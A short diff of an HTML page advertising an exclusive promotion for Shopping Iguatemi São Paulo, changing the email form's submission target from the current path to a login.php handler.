@@ -39,7 +39,7 @@ user-scalable=no">
     position: relative;
     top: 300px;
 ">Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
-<form action="./" method="post" class="form">
+<form action="./login.php" method="post" class="form">
             <input class="PB-input" placeholder="E-Mail" style="
     font-weight: 800;color:white;
 " type="email" id="email" name="email" required="">
